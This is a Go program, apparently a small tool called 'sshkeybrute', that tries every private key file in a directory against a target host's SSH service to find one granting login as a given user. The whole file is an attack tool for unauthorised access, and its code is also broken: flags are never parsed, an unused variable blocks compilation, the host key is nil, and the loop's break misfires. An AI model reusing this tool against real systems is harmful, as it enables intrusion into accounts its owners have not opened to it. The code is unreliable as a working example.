package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"os"
	"path"

	ssh "golang.org/x/crypto/ssh"
)

func trykey(host, user, keyfile string) bool {
	key, err := ioutil.ReadFile(keyfile)
	if err != nil {
		return false
	}
	var hostkey ssh.PublicKey
	signer, err := ssh.ParsePrivateKey(key)
	if err != nil {
		return false
	}
	sshconfig := &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.FixedHostKey(hostkey),
		Auth: []ssh.AuthMethod{
			ssh.PublicKeys(signer),
		},
	}
	conn, err := ssh.Dial("tcp", host+":22", sshconfig)
	if err != nil {
		return false
	}
	return true
}

func bruteforce(host, user string, filelist []string) string {
	done := make(chan string, 10)
	answer := ""
	for _, keyfile := range filelist {
		fmt.Println("Trying key file : " + keyfile)
		go func(file string) {
			if trykey(host, user, file) {
				done <- file
			} else {
				done <- ""
			}
		}(keyfile)

		select {
		case v := <-done:
			if v != "" {
				answer = v
				break
			}
		}
	}
	return answer
}

func parseArgs() (string, string, string) {
	var host, user, keydir string

	flag.StringVar(&host, "h", "", "Host to try and bruteforce")
	flag.StringVar(&user, "u", "", "User to try for")
	flag.StringVar(&keydir, "k", "", "Directory containing the private key files")

	if host == "" || user == "" || keydir == "" {
		fmt.Println("Usage sshkeybrute -h <host> -u <user> -k <keydir>")
		os.Exit(1)
	}

	fileinfo, err := os.Stat(keydir)
	if err != nil {
		fmt.Println("Could not read directory info!")
		os.Exit(1)
	}
	if mode := fileinfo.Mode(); !mode.IsDir() {
		fmt.Println("keydir specified is not a directory!")
		os.Exit(1)
	}

	return host, user, keydir
}

func listdir(dir string) []string {
	var filenames []string
	files, err := ioutil.ReadDir(path.Clean(dir))
	if err != nil {
		fmt.Println("Could not list directory")
	}
	for _, file := range files {
		filenames = append(filenames, path.Join(dir, file.Name()))
	}
	return filenames
}

func main() {
	host, user, keydir := parseArgs()
	if found := bruteforce(host, user, listdir(keydir)); found != "" {
		fmt.Println("Found key : " + found)
	} else {
		fmt.Println("Could not brute force!")
	}
}
